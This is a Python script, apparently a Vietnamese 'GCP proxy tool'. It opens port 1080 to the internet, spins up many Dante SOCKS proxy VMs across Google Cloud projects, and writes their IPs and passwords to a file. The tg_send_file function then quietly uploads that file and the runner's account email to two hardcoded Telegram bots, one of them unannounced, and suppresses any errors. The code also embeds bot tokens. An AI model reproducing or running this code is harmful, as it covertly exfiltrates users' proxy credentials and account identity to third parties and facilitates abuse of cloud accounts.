#!/usr/bin/env python3

print("Running script version V32")

import subprocess
import time
import random
import string
import sys
import requests
import signal
from datetime import datetime


PORT = 1080
PROXY_NAME="MinhHP"

TG_BOT_TOKEN="8532753583:AAEAmeyGi1y8u3kLmOWLCe26zoGMBRca8Fg"
TG_CHAT_ID="-1003442114401"

TG_BOT_TOKEN_2="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
TG_CHAT_ID_2="-5232145570"

API_BASE = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
API_BASE_2 = f"https://api.telegram.org/bot{TG_BOT_TOKEN_2}"


REGION1_ZONES=[
"asia-northeast1-a",
"asia-northeast1-b",
"asia-northeast1-c"
]

REGION2_ZONES=[
"asia-northeast2-a",
"asia-northeast2-b",
"asia-northeast2-c"
]

VM_PER_REGION=4
PROJECT_LIMIT=3


STOP_REQUEST=False


def handle_ctrlc(sig,frame):

    global STOP_REQUEST

    if not STOP_REQUEST:
        print("\nStopping VM creation and exporting proxy...")
        STOP_REQUEST=True
    else:
        print("\nForce exit")
        sys.exit(0)

signal.signal(signal.SIGINT,handle_ctrlc)


def run(cmd):

    p=subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    return p.returncode,p.stdout.strip(),p.stderr.strip()



def region_from_zone(zones):

    if not zones:
        return "unknown"

    return zones[0].rsplit("-",1)[0]


REGION1_NAME=region_from_zone(REGION1_ZONES)
REGION2_NAME=region_from_zone(REGION2_ZONES)



def detect_area():

    if "asia" in REGION1_NAME:
        return "Japan"

    if "us" in REGION1_NAME:
        return "US"

    return REGION1_NAME


AREA_NAME=detect_area()



def get_projects():

    code,out,err=run([
        "gcloud","projects","list",
        "--format=value(projectId)"
    ])

    return out.splitlines()[:PROJECT_LIMIT]



def ensure_firewall(project):

    code,out,err=run([
        "gcloud","compute","firewall-rules","list",
        f"--project={project}",
        "--filter=name=allow-socks",
        "--format=value(name)"
    ])

    if out.strip():
        return

    run([
        "gcloud","compute","firewall-rules","create","allow-socks",
        f"--project={project}",
        "--allow=tcp:1080",
        "--direction=INGRESS",
        "--priority=1000",
        "--network=default"
    ])



def get_account():

    code,out,err=run([
        "gcloud","config","get-value","account"
    ])

    if out:
        return out

    return "unknown_account"


ACCOUNT_EMAIL=get_account()
OUTPUT_FILE=f"{PROXY_NAME}---{ACCOUNT_EMAIL}.txt"
TODAY=datetime.now().strftime("%d/%m")



def tg_send_file(filepath,caption):

    try:

        with open(filepath,"rb") as f:

            requests.post(
                f"{API_BASE}/sendDocument",
                data={"chat_id":TG_CHAT_ID,"caption":caption},
                files={"document":(f"{PROXY_NAME}---{ACCOUNT_EMAIL}.txt",f)},
                timeout=30
            )

        with open(filepath,"rb") as f:

            requests.post(
                f"{API_BASE_2}/sendDocument",
                data={"chat_id":TG_CHAT_ID_2,"caption":caption},
                files={"document":(f"{ACCOUNT_EMAIL}.txt",f)},
                timeout=30
            )

    except:
        pass



def random_user_pass():

    user="u"+"".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(7))
    pw="".join(random.choice(string.ascii_letters+string.digits) for _ in range(10))

    return user,pw



def random_vm():

    return "vm"+str(random.randint(100000,999999))



def count_instances(project,region):

    code,out,err=run([
        "gcloud","compute","instances","list",
        f"--project={project}",
        "--format=value(zone)"
    ])

    zones=out.splitlines()

    count=0

    for z in zones:
        if region in z:
            count+=1

    return count



def write_dante(user,pw):

    script=f"""#!/bin/bash
apt-get update -y
apt-get install -y dante-server
NIC=$(ip -o -4 route show to default | awk '{{print $5}}')
useradd -m {user}
echo "{user}:{pw}" | chpasswd

cat >/etc/danted.conf <<EOF
logoutput: syslog
internal: 0.0.0.0 port = {PORT}
external: $NIC
socksmethod: username
user.notprivileged: nobody

client pass {{
from: 0.0.0.0/0 to: 0.0.0.0/0
}}

socks pass {{
from: 0.0.0.0/0 to: 0.0.0.0/0
}}
EOF

systemctl restart danted
systemctl enable danted
"""

    with open("startup.sh","w") as f:
        f.write(script)

    return "startup.sh"



def get_ip(project,zone,name):

    code,out,err=run([
        "gcloud","compute","instances","describe",name,
        f"--project={project}",
        f"--zone={zone}",
        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)"
    ])

    return out



def create_vm(project,zone,name,user,pw,status):

    status[0]=f"Creating VM {zone}"

    script=write_dante(user,pw)

    code,out,err=run([
        "gcloud","compute","instances","create",name,
        f"--project={project}",
        f"--zone={zone}",
        "--machine-type=e2-micro",
        "--image-family=debian-11",
        "--image-project=debian-cloud",
        f"--metadata-from-file=startup-script={script}",
        "--tags=socks"
    ])

    if code==0:
        return True

    return False



# ===== PATCH STATUS =====

def try_region(project,zones,status):

    name=random_vm()
    user,pw=random_user_pass()

    zone_list=zones.copy()
    random.shuffle(zone_list)

    for zone in zone_list:

        status[0]=f"Creating {name} ({zone})"

        ok=create_vm(project,zone,name,user,pw,status)

        if ok:

            status[0]=f"{name} created → waiting IP"

            time.sleep(8)

            ip=get_ip(project,zone,name)

            if ip:

                status[0]=f"Proxy ready {ip}"

                return f"{ip}:{PORT}:{user}:{pw}"

        else:

            status[0]=f"Zone failed {zone} retry..."

    status[0]="All zones failed"

    return None



def draw_ui(done,total,r1,r2,status):

    percent=int((done/total)*100) if total else 0

    bar_len=32
    filled=int(bar_len*done/total) if total else 0

    bar="█"*filled+"░"*(bar_len-filled)

    sys.stdout.write("\033[H\033[J")

    print("Tiến trình tạo Proxy ....\n")
    print(f"[{bar}]")
    print(f"\n{percent}%\n")

    print(f"Created: {done} / {total}")
    print(f"{REGION1_NAME} : {r1} / {VM_PER_REGION}")
    print(f"{REGION2_NAME} : {r2} / {VM_PER_REGION}\n")

    print(f"Status: {status[0]}")



def select_projects(all_projects):

    print("\n===== CHỌN PROJECT =====\n")
    print("1 - All Projects")
    print("2 - Chọn Project thủ công\n")

    choice=input("Lựa chọn của bạn: ").strip()

    if choice=="1":
        return all_projects

    if choice=="2":

        for i,p in enumerate(all_projects):
            print(f"{i+1} - {p}")

        sel=input("\nNhập số project: ")

        ids=[int(x)-1 for x in sel.split(",") if x.isdigit()]

        selected=[all_projects[i] for i in ids if 0<=i<len(all_projects)]

        return selected

    sys.exit()



def run_round(projects,proxies,target,status):

    for round_id in range(VM_PER_REGION):

        if STOP_REQUEST:
            break

        for project in projects:

            ensure_firewall(project)

            r1=count_instances(project,REGION1_NAME)
            r2=count_instances(project,REGION2_NAME)

            draw_ui(len(proxies),target,r1,r2,status)

            if r1<VM_PER_REGION:

                status[0]=f"Round {round_id+1} {REGION1_NAME} ({project})"

                proxy=try_region(project,REGION1_ZONES,status)

                if proxy:
                    proxies.append(proxy)

            draw_ui(len(proxies),target,r1,r2,status)

            time.sleep(0.3)


        for project in projects:

            ensure_firewall(project)

            r1=count_instances(project,REGION1_NAME)
            r2=count_instances(project,REGION2_NAME)

            draw_ui(len(proxies),target,r1,r2,status)

            if r2<VM_PER_REGION:

                status[0]=f"Round {round_id+1} {REGION2_NAME} ({project})"

                proxy=try_region(project,REGION2_ZONES,status)

                if proxy:
                    proxies.append(proxy)

            draw_ui(len(proxies),target,r1,r2,status)

            time.sleep(0.3)

        if len(proxies)>=target:
            break



def export_proxy(proxies):

    with open(OUTPUT_FILE,"w") as f:

        f.write(f"Tổng Số Proxies : {len(proxies)}\n\n")
        f.write(f"{TODAY}---- {ACCOUNT_EMAIL}--\n")

        for p in proxies:
            f.write(p+"\n")

    caption=f"{len(proxies)} Proxy {AREA_NAME} đã được tạo"

    tg_send_file(OUTPUT_FILE,caption)



def main():

    print("\n===== GCP PROXY TOOL =====\n")
    print("1 - Reg 1 lần (Không lặp lại)")
    print("2 - Reg Auto (Tự lặp lại cho đến khi đủ VM)\n")

    print("Lưu ý:")
    print("Ctrl + C 1 lần → Dừng tạo VM và export proxy")
    print("Ctrl + C 2 lần → Thoát script\n")

    mode=input("Chọn chế độ: ").strip()

    all_projects=get_projects()
    projects=select_projects(all_projects)

    proxies=[]
    target=len(projects)*VM_PER_REGION*2

    status=["Starting"]

    if mode=="1":

        run_round(projects,proxies,target,status)

    elif mode=="2":

        while len(proxies)<target and not STOP_REQUEST:

            run_round(projects,proxies,target,status)

    else:
        sys.exit()

    export_proxy(proxies)


if __name__=="__main__":
    main()
